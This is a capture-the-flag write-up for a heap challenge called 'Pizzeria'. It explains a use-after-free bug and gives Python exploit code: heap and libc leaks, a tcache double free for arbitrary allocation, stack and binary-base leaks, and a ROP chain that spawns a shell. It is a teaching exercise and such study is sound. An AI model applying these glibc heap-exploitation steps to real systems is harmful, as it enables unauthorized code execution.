# Pizzeria
```
 ____    _                        _ 
|  _ \  | |      __ _  _ __    __| |
| |_) | | |     / _` || '_ \  / _` |
|  _ <  | |___ | (_| || | | || (_| |
|_| \_\ |_____| \__,_||_| |_| \__,_|

 ____   _                        _        
|  _ \ (_) ____ ____  ___  _ __ (_)  __ _ 
| |_) || ||_  /|_  / / _ \| '__|| | / _` |
|  __/ | | / /  / / |  __/| |   | || (_| |
|_|    |_|/___|/___| \___||_|   |_| \__,_|

Choose one of the following options:
1. Add topping
2. Customize topping
3. Remove topping
4. Verify toppings
5. Bake Pizza
Enter your choice : 
```

This challenge is a pizza-topping picker. It contains a list of allowed toppings:
- Tomato, Onion, Capsicum, Corn, Mushroom, Pineapple, Olives, Double Cheese, Paneer, Chicken

And it lets you add a chosen quantity (up to 63) of any one of these toppings:
```
Enter your choice : 1

Which topping ?
Tomato
How much ?
8
Ok, adding Tomato
```

You can customize your toppings, which lets you edit its contents:
```
Enter your choice : 2

Which one to customize ?
Tomato
Enter new modified topping : San Marzano
New topping added successfully !
```

You can check the contents of a topping:
```
Enter your choice : 4

Which topping to verify ?
Tomato
San Marzano
```

And you can remove toppings:
```
Enter your choice : 3

Which topping to remove ?
Tomato
Tomato removed successfully !
```

Lastly, you can leave:
```
Enter your choice : 5

Baking ....
Here it is : 🍕
```
# How it works
"Toppings" are just strings allocated with `malloc`. Adding means allocating, removing means freeing, customizing means reading and verifying means writing. Leaving frees all the toppings and exits (doesn't return).
Each topping is a `char[]` with size `8*input_size`, and the max `input_size` is 63, so the biggest chunk you can get is 0x200.

Toppings are stored on the stack along with their sizes and with the list of allowed toppings, like this:
```c
int sizes[10];
char* allocated_toppings[10];
char* allowed_toppings[10];
```
# Vulnerability
Here's a simplified view of the `remove_topping` function:
```c
void remove_topping(char** allocated_toppings, char** allowed_toppings, int* sizes) {
    char chosen_topping[15];
    int idx;

    puts("Which topping to remove ?");
    fgets(chosen_topping, 15, stdin);
    chosen_topping[strcspn(chosen_topping, "\n")] = 0;
    idx = get_index(chosen_topping, allowed_toppings);
    free(allocated_toppings[idx]);
    sizes[idx] = 0;
    printf("%s removed successfully !\n", allowed_toppings[idx]);
}
```

It doesn't set `allocated_toppings[idx]` to `NULL`, meaning we can keep using that topping even though it's now a freed chunk. This is a UAF (User After Free).

The binary has all protections turned on and uses libc 2.35.
# Attack
We can allocate a chunk, free it, and then read it to leak the heap via a tcache forward pointer:
```python
io = conn()

malloc(io, toppings[0], 63)
free(io, toppings[0])
heap = u64(read(io, toppings[0]).ljust(8, b'\0')) << 12
aleak("heap", heap)
```

The biggest chunk size we can have is 0x200, which fits in the tcache but not in the fastbin, so if we fill the tcache and free another chunk, it'll end up in the unsorted bin giving us a libc leak:
```python
for i in range(7): malloc(io, toppings[i], 63)
malloc(io, toppings[7], 63)
malloc(io, toppings[8], 63) # barrier to avoid top chunk consolidation
for i in range(7): free(io, toppings[i])
free(io, toppings[7])
free(io, toppings[8])

libc.address = u64(read(io, toppings[7]).ljust(8, b'\0')) - (libc.sym.main_arena+96)
aleak("libc", libc.address)
```

We can also do a double free, first filling the tcache, then triggering the double free, and then empty the tcache and allocate again, which will move the chunks from the fastbin to the tcache. This lets us have the same chunk both allocated and freed at the same time, letting us overwrite its tcache forward pointer and achieve arbitrary allocation.

We can actually use this to achieve infinite arbitrary allocations; to understand how here's what the tcache really is (simplified):
```c
struct tcache {
    uint16_t bin_counters[N_BINS];
    void*    first_chunk [N_BINS];
};
```

If you run `bins` via pwndbg to check the tcache, you'll see something like this:
```c
tcachebins
0x60  [  2]: 0x55705a2bf280 —▸ 0x55705a2bf220
0x200 [  7]: 0x55705a2beea0 —▸ 0x55705a2beca0 —▸ 0x55705a2beaa0 —▸ 0x55705a2be8a0 —▸ 0x55705a2be6a0 —▸ 0x55705a2be4a0 —▸ 0x55705a2be2a0 ◂— 0x0
```

That counter in the \[brackets\] and the first pointer (leftmost) are taken straight from that struct. And the first pointer, unlike the next ones, is NOT mangled.
Knowing this, if we allocate on top of this struct we'll be able to modify the counters and pointers by juts editing our topping, so we can just set all the counters to a high number and keep setting the pointer to wherever we wanna go.

I don't need that many allocations, and modifying the counters makes the exploit a little bit more complicated, so i chose to allocate onto the pointer for the 0x200 chunks, since its counter was 7 from when I leaked libc and that's enough allocations to finish the exploit:
```python
addr = (heap + 0x180) ^ ((heap + 0x1000) >> 12)

for i in range(7): malloc(io, toppings[i], 10)
malloc(io, toppings[7], 10)
malloc(io, toppings[8], 10)
for i in range(7): free(io, toppings[i])
free(io, toppings[7])
free(io, toppings[8])
free(io, toppings[7])

for i in range(7): malloc(io, toppings[i], 10)
malloc(io, toppings[7], 10)
edit(io, toppings[7], p64(addr))
malloc(io, toppings[8], 10)
malloc(io, toppings[9], 10)
malloc(io, toppings[9], 10) # now we can modify this chunk with any address we want to allocate
```

Now I allocated a chunk onto `environ` to leak the stack:
```python
edit(io, toppings[9], p64(libc.sym.environ))
malloc(io, toppings[0], 63)
stack = u64(read(io, toppings[0]).ljust(8, b'\0'))
aleak("stack", stack)
```

And onto some pointer to the binary on the stack to leak the binary's base:
```python
pie_ret = stack - 0x188
edit(io, toppings[9], p64(pie_ret))
malloc(io, toppings[0], 63)
exe.address = u64(read(io, toppings[0]).ljust(8, b'\0')) - 0x23db
aleak("exe", exe.address)
```

I used one of the allowed toppings' strings to leak the binary's base, which fucked the next one up (it seems that malloc sets `*(chunk_addr+8)` to 0), so I had to fix it or the binary would crash:
```python
edit(io, toppings[0], flat(exe.address + 0x23db, exe.address + 0x23e2))
```

Both canaries and return pointers are at non-16 aligned addresses, so I couldn't just allocate onto them. I decided to allocate onto the list of allocated toppings to have infinite and truly arbitrary allocations:
```python
edit(io, toppings[9], p64(stack - 0x1d8))
malloc(io, toppings[8], 63)
```

The `bake_pizza` function doesn't actually `return`, it just calls `exit`, so I chose to allocate onto `customize_topping`'s return pointer, that way it would return right after my edit. And i overwrote it with a rop chain:
```python
edit(io, toppings[8], p64(stack-0x220))
rop = ROP([exe, libc])
rop.raw(rop.ret)
rop.system(libc.binsh())
edit(io, toppings[0], rop.chain())
```

And BOOM 💥 we've popped a shell!
Really nice challenge, I enjoyed it very much.